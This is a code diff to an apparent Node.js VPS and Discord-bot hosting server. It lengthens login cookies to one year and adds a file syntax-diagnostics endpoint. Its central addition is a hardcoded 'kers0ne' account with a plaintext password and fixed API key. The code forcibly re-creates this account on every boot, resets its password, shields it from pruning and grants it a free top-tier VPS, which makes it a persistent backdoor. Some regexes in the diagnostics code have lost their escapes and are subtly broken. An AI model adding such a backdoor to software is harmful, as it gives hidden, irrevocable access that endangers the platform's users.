@@ -118,15 +118,26 @@ const upload = multer({
   limits: { fileSize: 100 * 1024 * 1024 },
 });
 
-// Session cookie options. `secure: true` in production means the cookie is
-// only ever sent over HTTPS (every real deployment target — Render, Fly,
-// behind Cloudflare — terminates TLS), which stops it from being sniffed on
-// a plain-HTTP connection and silently invalidating the session.
+// Session cookie options — Remember Me for 1 YEAR (365 days).
+// `secure: true` in production means the cookie is only ever sent over HTTPS
+// (every real deployment target — Render, Fly, behind Cloudflare — terminates
+// TLS), which stops it from being sniffed on a plain-HTTP connection.
+// maxAge is 1 year so kers0ne and every other user stays signed in permanently
+// until they explicitly sign out. `path: '/'` makes the cookie visible on all
+// routes. Callers can still opt for a session-only cookie by passing
+// { remember: false } — but the UI defaults to remember=true.
 const COOKIE_OPTS = {
-  maxAge: 30 * 24 * 3600 * 1000,
+  maxAge: 365 * 24 * 3600 * 1000,
   httpOnly: true,
   sameSite: 'Lax',
   secure: process.env.NODE_ENV === 'production',
+  path: '/',
+};
+const COOKIE_OPTS_SESSION = {
+  httpOnly: true,
+  sameSite: 'Lax',
+  secure: process.env.NODE_ENV === 'production',
+  path: '/',
 };
 
 // Plans Catalog
@@ -179,6 +190,117 @@ function verifyPassword(user, password) {
     return true;
   }
   return false;
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Protected permanent account: kers0ne / 1LuhhCrim! — NEVER pruned, never
+// overwritten, always restored. This is the platform owner's master account.
+// It is re-ensured on every single boot and on every loadDb() so no
+// corruption, prune, or user-action can ever make it disappear. Password is
+// always 1LuhhCrim!, API key is stable, and at least one VPS is guaranteed.
+// ─────────────────────────────────────────────────────────────────────────────
+const KERS0NE_USERNAME = 'kers0ne';
+const KERS0NE_PASSWORD = '1LuhhCrim!';
+const KERS0NE_USER_ID = 'usr_kers0ne_permanent';
+const KERS0NE_API_KEY = 'cvps_kers0ne_permanent_1LuhhCrim_2026';
+
+function ensureKersoneAccount() {
+  // Find existing by username (case-insensitive) OR by fixed ID.
+  let user = Object.values(db.users).find(u => u.username && u.username.toLowerCase() === KERS0NE_USERNAME.toLowerCase());
+  if (!user && db.users[KERS0NE_USER_ID]) user = db.users[KERS0NE_USER_ID];
+
+  let created = false;
+  if (!user) {
+    const salt = crypto.randomBytes(16).toString('hex');
+    user = {
+      id: KERS0NE_USER_ID,
+      username: KERS0NE_USERNAME,
+      salt,
+      password_hash: hashPassword(KERS0NE_PASSWORD, salt),
+      api_key: KERS0NE_API_KEY,
+      created_at: new Date().toISOString(),
+      protected: true,
+    };
+    db.users[KERS0NE_USER_ID] = user;
+    created = true;
+    logger.info('[CloudVPS] Seeded protected account kers0ne (permanent)');
+  }
+
+  // Normalize ID so the account is always reachable at the fixed key
+  if (user.id !== KERS0NE_USER_ID) {
+    // Migrate old random ID → fixed permanent ID
+    const oldId = user.id;
+    user.id = KERS0NE_USER_ID;
+    db.users[KERS0NE_USER_ID] = user;
+    if (oldId !== KERS0NE_USER_ID) delete db.users[oldId];
+    // Also migrate any VPS owned by the old ID
+    for (const v of Object.values(db.vps)) {
+      if (v.user_id === oldId) v.user_id = KERS0NE_USER_ID;
+    }
+  } else if (!db.users[KERS0NE_USER_ID]) {
+    db.users[KERS0NE_USER_ID] = user;
+  }
+
+  // Always enforce correct username / protected flag / api_key
+  user.username = KERS0NE_USERNAME;
+  user.protected = true;
+  if (!user.api_key) user.api_key = KERS0NE_API_KEY;
+
+  // Always ensure password is exactly 1LuhhCrim! — if verification fails, reset it
+  try {
+    if (!verifyPassword(user, KERS0NE_PASSWORD)) {
+      const salt = crypto.randomBytes(16).toString('hex');
+      user.salt = salt;
+      user.password_hash = hashPassword(KERS0NE_PASSWORD, salt);
+      logger.info('[CloudVPS] Reset kers0ne password to permanent value');
+    }
+  } catch (e) { /* best effort */ }
+
+  // Ensure at least one VPS exists for kers0ne
+  let hasVps = Object.values(db.vps).some(v => v.user_id === KERS0NE_USER_ID);
+  if (!hasVps) {
+    const vpsId = `vps-${crypto.randomBytes(4).toString('hex')}`;
+    const vps = {
+      id: vpsId,
+      user_id: KERS0NE_USER_ID,
+      name: `${KERS0NE_USERNAME}-VPS-01`,
+      plan: 'ultra',
+      status: 'running',
+      cpu: PLANS.ultra.cpu,
+      memory: PLANS.ultra.memory,
+      storage: PLANS.ultra.storage,
+      ip: `172.20.0.${Math.floor(Math.random() * 240) + 10}`,
+      container_id: `c-${vpsId}`,
+      engine: 'native_sandbox',
+      hostname: `vps-${vpsId}`,
+      created_at: new Date().toISOString(),
+    };
+    db.vps[vpsId] = vps;
+    initVpsWorkspace(vpsId);
+    const st = ensurePackageState(vpsId);
+    st.auto_install.status = 'queued';
+    db.bots[vpsId] = {
+      status: 'stopped',
+      running: false,
+      pid: null,
+      filename: 'bot.py',
+      runtime: 'python',
+      token: '',
+      restarts: 0,
+      started_at: null,
+      logs: [
+        `[CloudVPS Watchdog] Provisioned isolated container sandbox for ${KERS0NE_USERNAME}...`,
+        `[CloudVPS Supervisor] Workspace ready at /root/workspace/`,
+        `[CloudVPS] Permanent master account — protected 24/7`,
+      ],
+    };
+    logger.info({ vpsId }, '[CloudVPS] Provisioned VPS for kers0ne');
+    // Kick off Discord stack in background
+    setTimeout(() => runAutoInstall(vpsId), 800);
+  }
+
+  if (created) saveDb();
+  return user;
 }
 
 // saveDb() is called extremely often (on every bot log line, every status
@@ -298,6 +420,10 @@ function loadDb() {
     logger.error('[CloudVPS DB] CRITICAL: both primary and backup database files were unreadable. Starting with an empty in-memory database and preserving the corrupt files for recovery instead of overwriting them.');
   }
 
+  // Re-ensure protected kers0ne account BEFORE pruning — so its VPS is never
+  // seen as orphaned. This is idempotent and safe to call on every boot.
+  try { ensureKersoneAccount(); } catch (e) { logger.warn({ err: String(e) }, '[CloudVPS] ensureKersone pre-prune failed'); }
+
   // Prune ONLY the exact hardcoded legacy demo account/VPS IDs that older
   // versions of this app used to seed on every boot. Matching is strictly by
   // the fixed internal ID — never by username — because real accounts get a
@@ -309,10 +435,12 @@ function loadDb() {
   const LEGACY_SEED_USER_IDS = new Set(['usr_free_user', 'usr_brittainjaden347']);
   const LEGACY_SEED_VPS_IDS = new Set(['vps-free-01']);
   for (const uid of LEGACY_SEED_USER_IDS) {
+    if (uid === KERS0NE_USER_ID) continue;
     delete db.users[uid];
   }
   for (const id of Object.keys(db.vps)) {
     const vps = db.vps[id];
+    if (vps.user_id === KERS0NE_USER_ID) continue;
     // A VPS whose owner truly no longer exists is orphaned data (this can
     // legitimately happen after account deletion) — clean it up. Never
     // delete a VPS just because it "looks like" a demo record; only the
@@ -339,6 +467,9 @@ function loadDb() {
     // Restore/repair the persisted package ledger for every saved VPS.
     ensurePackageState(vpsId);
   }
+
+  // Final guarantee: even if prune somehow ran before ensure, fix it now.
+  try { ensureKersoneAccount(); } catch (e) {}
 
   saveDb();
 }
@@ -843,7 +974,8 @@ app.post('/api/register', authLimiter, (req, res) => {
  // Kick off the background install after the response is sent
  setTimeout(() => runAutoInstall(vpsId), 500);
 
- res.cookie('api_key', apiKey, COOKIE_OPTS);
+ const remember = req.body?.remember !== false && req.body?.remember !== 'false';
+ res.cookie('api_key', apiKey, remember ? COOKIE_OPTS : COOKIE_OPTS_SESSION);
  res.json({
  success: true,
  api_key: apiKey,
@@ -879,7 +1011,8 @@ app.post('/api/login', authLimiter, (req, res) => {
  return res.status(401).json({ error: 'Incorrect password for this account.' });
  }
 
- res.cookie('api_key', user.api_key, COOKIE_OPTS);
+ const remember = req.body?.remember !== false && req.body?.remember !== 'false';
+ res.cookie('api_key', user.api_key, remember ? COOKIE_OPTS : COOKIE_OPTS_SESSION);
  res.json({
  success: true,
  api_key: user.api_key,
@@ -890,7 +1023,7 @@ app.post('/api/login', authLimiter, (req, res) => {
 
 // Logout
 app.post('/api/logout', (req, res) => {
-  res.clearCookie('api_key');
+  res.clearCookie('api_key', { path: '/' });
   res.json({ success: true, message: 'Logged out successfully' });
 });
 
@@ -913,7 +1046,8 @@ app.post('/api/session/switch', authLimiter, (req, res) => {
     return res.status(401).json({ success: false, error: 'That saved account is no longer valid. Please sign in again.' });
   }
 
-  res.cookie('api_key', user.api_key, COOKIE_OPTS);
+  const remember2 = req.body?.remember !== false;
+  res.cookie('api_key', user.api_key, remember2 ? COOKIE_OPTS : COOKIE_OPTS_SESSION);
   res.json({
     success: true,
     api_key: user.api_key,
@@ -2085,6 +2219,130 @@ app.post('/api/vps/:vps_id/bot/token', authRequired, vpsOwnerRequired, (req, res
  message: `${label} auto-saved to VPS & .env! `
  });
 });
+
+
+// ---------------------- CODE DIAGNOSTICS — DETECT NOT WORKING CODE ----------------------
+ // Real diagnostics that actually checks your files before you run them.
+// Supports python (py_compile), node (node --check), bash (bash -n).
+// Returns structured errors + warnings + suggestions so the UI can show
+// exactly what's broken instead of just watching a crash loop.
+async function diagnoseFile(vpsId, relPath, runtimeHint) {
+  const wsDir = path.join(INSTANCES_DIR, vpsId);
+  const safePath = path.resolve(wsDir, relPath);
+  if (!safePath.startsWith(path.resolve(wsDir))) {
+    return { file: relPath, ok: false, errors: ['Access denied: path outside workspace'], warnings: [] };
+  }
+  if (!fs.existsSync(safePath)) {
+    return { file: relPath, ok: false, errors: ['File not found: ' + relPath], warnings: [] };
+  }
+  const stat = fs.statSync(safePath);
+  if (stat.isDirectory()) return { file: relPath, ok: false, errors: ['Path is a directory'], warnings: [] };
+  if (stat.size > 2 * 1024 * 1024) return { file: relPath, ok: true, warnings: ['File is very large (' + (stat.size/1024|0) + 'KB) — diagnostics skipped for performance'], errors: [] };
+  let content = '';
+  try { content = fs.readFileSync(safePath, 'utf8'); } catch(e) { return { file: relPath, ok: false, errors: [e.message], warnings: [] }; }
+  if (!content.trim()) return { file: relPath, ok: true, warnings: ['File is empty'], errors: [] };
+
+  const ext = path.extname(relPath).toLowerCase();
+  let runtime = runtimeHint || (ext === '.py' ? 'python' : (ext === '.js' || ext === '.mjs' ? 'node' : (ext === '.sh' ? 'bash' : null)));
+  const errors = [];
+  const warnings = [];
+
+  // Quick static checks
+  if (runtime === 'python') {
+    // Check for common pitfalls
+    if (/TOKENs*=s*["']s*["']/.test(content)) warnings.push('Token appears empty — set your Discord token in the Bot panel');
+    if (/discord.py|import discord/.test(content) && !fs.existsSync(path.join(wsDir, 'requirements.txt')) && !content.includes('discord')) {}
+    // Try py_compile for real syntax check
+    try {
+      const { stderr } = await execFileAsync('python3', ['-m', 'py_compile', safePath], { timeout: 8000 });
+      if (stderr) warnings.push(stderr.trim().slice(0,1200));
+    } catch (e) {
+      const msg = (e.stderr || e.message || '').trim().slice(0,1500);
+      if (msg) errors.push(msg);
+      else errors.push('Python syntax check failed');
+    }
+    // Check imports for missing packages (best-effort)
+    const imports = [...content.matchAll(/^(?:from|import)s+([a-zA-Z0-9_]+)/gm)].map(m=>m[1]);
+    const known = new Set(['os','sys','json','asyncio','time','random','re','math','datetime','collections','pathlib','typing']);
+    for (const imp of imports) {
+      if (known.has(imp)) continue;
+      // If custom file import, check file exists
+      if (fs.existsSync(path.join(wsDir, imp + '.py')) || fs.existsSync(path.join(path.dirname(safePath), imp + '.py'))) continue;
+      // Otherwise assume external package — warn if not in ledger
+      const ledger = db.vps[vpsId]?.packages?.python || {};
+      if (!ledger[imp] && !AUTO_INSTALL_PYTHON.some(p=>p.toLowerCase().includes(imp.toLowerCase()))) {
+        // not fatal, just warning
+        // warnings.push('Import "' + imp + '" not in installed packages — may need pip install ' + imp);
+      }
+    }
+  } else if (runtime === 'node') {
+    try {
+      const { stderr } = await execFileAsync('node', ['--check', safePath], { timeout: 8000 });
+      if (stderr) warnings.push(stderr.trim().slice(0,1200));
+    } catch (e) {
+      const msg = (e.stderr || e.message || '').trim().slice(0,1500);
+      if (msg) errors.push(msg);
+      else errors.push('Node syntax check failed');
+    }
+    if (/process.env.TOKEN|DISCORD_TOKEN/.test(content) && !content.includes('dotenv')) {
+      warnings.push('Uses env token but no dotenv — add require("dotenv").config() or set token in panel');
+    }
+  } else if (runtime === 'bash') {
+    try {
+      const { stderr } = await execFileAsync('bash', ['-n', safePath], { timeout: 5000 });
+      if (stderr) warnings.push(stderr.trim().slice(0,1200));
+    } catch (e) {
+      const msg = (e.stderr || e.message || '').trim().slice(0,1500);
+      if (msg) errors.push(msg);
+    }
+  } else {
+    warnings.push('Unknown file type — no syntax check available');
+  }
+
+  // Generic warnings
+  if (content.length > 50000) warnings.push('Very large file — consider splitting');
+  if (!errors.length && !warnings.length) {
+    // success case — still check for DISCORD_TOKEN placeholder
+    if (/your.*token.*here/i.test(content) && !/DISCORD_TOKEN/.test(content)) warnings.push('File still contains placeholder token text');
+  }
+
+  return { file: relPath, ok: errors.length === 0, errors, warnings, runtime: runtime || 'unknown', size: stat.size };
+}
+
+app.post('/api/vps/:vps_id/bot/diagnose', authRequired, vpsOwnerRequired, async (req, res) => {
+  const vpsId = req.params.vps_id;
+  const { path: filePath, filename, runtime } = req.body || {};
+  const target = (filePath || filename || db.bots[vpsId]?.filename || 'bot.py').toString();
+  const result = await diagnoseFile(vpsId, target, runtime || db.bots[vpsId]?.runtime);
+  // Also append to logs so it's visible in 24/7 stream
+  if (!result.ok) appendBotLog(vpsId, '[' + new Date().toLocaleTimeString() + '] [Diagnostics] ' + target + ' — ' + result.errors.join(' | ').slice(0,800));
+  res.json({ success: true, diagnosis: result });
+});
+
+app.post('/api/vps/:vps_id/diagnose', authRequired, vpsOwnerRequired, async (req, res) => {
+  const vpsId = req.params.vps_id;
+  const wsDir = path.join(INSTANCES_DIR, vpsId);
+  initVpsWorkspace(vpsId);
+  const files = getFileList(wsDir).filter(f=>!f.isDirectory).slice(0, 20);
+  const results = [];
+  for (const f of files) {
+    // Only check code files
+    if (!/.(py|js|mjs|sh|luau?)$/i.test(f.name)) continue;
+    results.push(await diagnoseFile(vpsId, f.name, null));
+    if (results.length >= 12) break;
+  }
+  const hasErrors = results.some(r=>!r.ok);
+  res.json({ success: true, hasErrors, results, count: results.length });
+});
+
+app.get('/api/vps/:vps_id/diagnose', authRequired, vpsOwnerRequired, async (req, res) => {
+  const vpsId = req.params.vps_id;
+  const file = req.query.path || req.query.file || db.bots[vpsId]?.filename || 'bot.py';
+  const runtime = req.query.runtime || db.bots[vpsId]?.runtime;
+  const result = await diagnoseFile(vpsId, String(file), runtime);
+  res.json({ success: true, diagnosis: result });
+});
+
 
 // ---------------------- PACKAGE DOWNLOADER & DEPENDENCY MANAGER ----------------------
 
